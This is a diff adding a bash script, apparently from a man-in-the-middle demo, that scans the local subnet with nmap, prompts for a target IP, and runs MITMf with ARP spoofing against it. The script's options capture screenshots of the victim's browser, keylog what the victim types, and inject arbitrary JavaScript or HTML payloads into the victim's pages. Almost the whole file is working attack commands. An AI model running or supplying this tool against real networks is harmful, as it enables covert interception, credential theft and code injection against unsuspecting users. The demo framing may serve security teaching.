@@ -1,0 +1,65 @@
+#!/bin/bash
+echo "Script Description: This script uses 'MITMf' plugins to perform several attacks on a target device :\n
+	1-ScreenShotter : to take screenshots from the target browser.
+	2-JSKeylogger : to log and see anything the victim is typing.
+	3-Inject : to inject a JS/HTML code into the victim's browser."
+echo ~~Tools required :
+echo "	1-MITMf: apt-get install mitmf"
+
+
+echo ~~Listing network interfaces \"ifconfig\"
+ifconfig
+read -p "~~Enter the network interface name that will be used: " interfaceName
+echo $interfaceName selected
+echo ~~Getting the network default gateway \"ip route | grep default\"
+defGateway=`ip route | grep default | awk  '{print $3}'`
+echo "~~Scanning for connected devices \"nmap -sn $defGateway/24\""
+nmap -sn $defGateway/24
+read -p "~~Enter target device IP: " ClientIP
+echo ~~List of plugins: 
+echo "	1-ScreenShotter"
+echo "	2-JSKeylogger"
+echo "	3-Inject"
+read -p "~~Select a plugin: " pluginNumber
+
+  case $pluginNumber in
+    1)
+	read -p "~~Enter interval time between screenshots: " interval 
+	echo "~~Starting the plugin using MITMf \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --screen --interval $interval\""
+	echo '~~Go to the target device and use the browser to search for anything'
+	echo '~~Navigating to /var/log/mitmf/ to see the screenshots'
+	#nautilus /var/log/mitmf/ 
+	mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --screen --interval $interval
+        ;;
+    2)		
+	echo "~~Starting the plugin using MITMf \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --jskeylogger\""
+	echo '~~Go to the target device and browse anything then check the MITMf logs'
+	mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --jskeylogger
+        ;;
+    3)
+	echo ~~List of options: 
+	echo "	1-Payload"
+	echo "	2-File"
+	read -p "~~Select an option: " option
+		case $option in
+		    1)
+			read -p "~~Write your payload here (eg:\"alert('Hello!');\"): " payload 
+			echo "~~Starting the plugin using MITMf \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-payload $payload\""
+			echo '~~Go to the client device and use the browser'
+			mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-payload $payload
+			;;
+		    2)		
+			read -p "~~Enter your JS/HTML file path here (eg: /Demo-2-MITM-Attacks/MiTMF-Plugins-sample-javascript.js): " path 
+			echo "~~Starting the plugin using MITMf \"mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-file $path\""
+			echo '~~Go to the target device and use the browser'
+			mitmf --arp --spoof --gateway $defGateway --target $ClientIP -i $interfaceName --inject --js-file $path
+			;;
+		  
+		    esac
+        ;;
+    esac
+
+
+
+
+
